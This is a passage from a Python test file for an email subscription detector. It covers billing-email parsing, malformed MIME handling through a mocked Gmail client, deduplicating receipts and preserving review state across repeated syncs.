    assert ship_result.reason == "shipping_tracking"


def test_regression_brand_mention_without_billing_evidence_skipped():
    """Verify mere brand mention in conversational email is skipped without inferring a subscription."""
    chat_email = (
        "Hey! Have you seen that new sci-fi documentary on Netflix?\n"
        "It's really cool, you should check it out when you have time.\n"
    )
    result = evaluate_billing_email(
        message_id="msg_netflix_chat_01",
        subject="Check out this cool show",
        sender="colleague@example.com",
        raw_content=chat_email,
    )
    assert result.status == "skipped"
    assert result.candidate is None


def test_regression_malformed_mime_content_handled_safely():
    """Verify corrupted base64 or malformed MIME content records parsing failure without crashing."""
    corrupt_data = "!!!NOT_VALID_BASE64_AT_ALL_$$$%%%"

    def mock_corrupt_handler(request: httpx.Request) -> httpx.Response:
        url_str = str(request.url)
        if "messages?" in url_str:
            return httpx.Response(200, json={"messages": [{"id": "msg_corrupt_01"}]})
        elif "messages/msg_corrupt_01" in url_str:
            return httpx.Response(
                200,
                json={
                    "id": "msg_corrupt_01",
                    "payload": {
                        "headers": [
                            {"name": "Subject", "value": "Receipt for your purchase"},
                            {"name": "From", "value": "billing@spotify.com"},
                        ],
                        "parts": [
                            {"mimeType": "text/html", "body": {"data": corrupt_data}},
                        ],
                    },
                },
            )
        return httpx.Response(404)

    transport = httpx.MockTransport(mock_corrupt_handler)
    mock_client = httpx.Client(transport=transport)

    metrics: Dict[str, Any] = {
        "messages_retrieved": 0,
        "candidates_created": 0,
        "messages_skipped": 0,
        "duplicates_skipped": 0,
        "parsing_failures": 0,
    }

    candidates = _fetch_live_gmail_candidates(
        access_token="mock_token",
        user_id="user_corrupt_test",
        max_messages=5,
        client=mock_client,
        metrics=metrics,
    )

    assert candidates == []
    assert metrics["messages_retrieved"] == 1
    assert metrics["parsing_failures"] == 1
    assert metrics["failure_reasons"].get("malformed_mime") == 1


def test_regression_duplicate_messages_in_batch():
    """Verify multiple receipts for the same merchant in a single batch are deduplicated into one."""
    cand1 = parse_billing_email(
        message_id="msg_netflix_batch_01",
        subject="Your Netflix invoice for October",
        sender="billing@netflix.com",
        raw_content="Payment of $15.49 received on October 1, 2026. Next renewal: 2026-11-01.",
    )
    cand2 = parse_billing_email(
        message_id="msg_netflix_batch_02",
        subject="Your Netflix invoice for November",
        sender="billing@netflix.com",
        raw_content="Payment of $15.49 received on November 1, 2026. Next renewal: 2026-12-01.",
    )
    assert cand1 is not None and cand2 is not None

    deduped = group_and_deduplicate_candidates([cand1, cand2])
    assert len(deduped) == 1
    merged = deduped[0]
    assert merged.merchant_name == "Netflix"
    # Merged record retains latest renewal date
    assert str(merged.detected_renewal_date) == "2026-12-01"


def test_regression_repeated_sync_preserves_state_and_deduplicates():
    """Verify repeated mailbox sync does not duplicate candidates or revert confirmed review status."""
    user_id = f"user_repeated_sync_{uuid.uuid4().hex[:8]}"

    # Step 1: Connect account
    auth = client.get("/api/email/oauth/url", headers={"X-User-ID": user_id}).json()
    client.get(f"/api/email/oauth/callback?code=mock_code&state={auth['state']}")

    # Step 2: First sync -> 5 candidates created
    sync1_resp = client.post("/api/email/sync", headers={"X-User-ID": user_id})
    assert sync1_resp.status_code == 200
    sync1_data = sync1_resp.json()
    assert sync1_data["synced_count"] == 5
    assert sync1_data["duplicates_skipped"] == 0
    assert sync1_data["parsing_failures"] == 0

    cands_1 = client.get("/api/email/candidates", headers={"X-User-ID": user_id}).json()
    assert len(cands_1) == 5

    # Step 3: Confirm first candidate (Netflix)
    cand_to_confirm = next(c for c in cands_1 if "netflix" in c["candidate_id"].lower())
    conf_resp = client.post(
        f"/api/email/candidates/{cand_to_confirm['candidate_id']}/confirm",
        headers={"X-User-ID": user_id},
    )
    assert conf_resp.status_code == 200

    # Step 4: Second sync (Repeated Sync with identical messages)
    sync2_resp = client.post("/api/email/sync", headers={"X-User-ID": user_id})
    assert sync2_resp.status_code == 200
    sync2_data = sync2_resp.json()

    # Verify duplicate count accurately reflects collapsed repeat messages
    assert sync2_data["duplicates_skipped"] >= 1
    assert sync2_data["parsing_failures"] == 0

    # Step 5: Verify candidates table: Confirmed candidate REMAINS confirmed and not duplicated
    cands_2 = client.get("/api/email/candidates", headers={"X-User-ID": user_id}).json()
    confirmed_cand = next(c for c in cands_2 if c["candidate_id"] == cand_to_confirm["candidate_id"])
    assert confirmed_cand["review_status"] == "confirmed"

    # Ensure total distinct candidates for this user didn't blow up with duplicates
    merchant_names = [c["merchant_name"] for c in cands_2]
    assert len(merchant_names) == len(set(merchant_names))

    # Step 6: Verify diagnostics endpoint truthful reporting
    diag_resp = client.get("/api/email/diagnostics", headers={"X-User-ID": user_id})
    assert diag_resp.status_code == 200
    diag = diag_resp.json()
    assert diag["messages_retrieved"] == 5
    assert diag["parsing_failures"] == 0
    assert diag["duplicates_skipped"] >= 1
    assert "messages_skipped" in diag
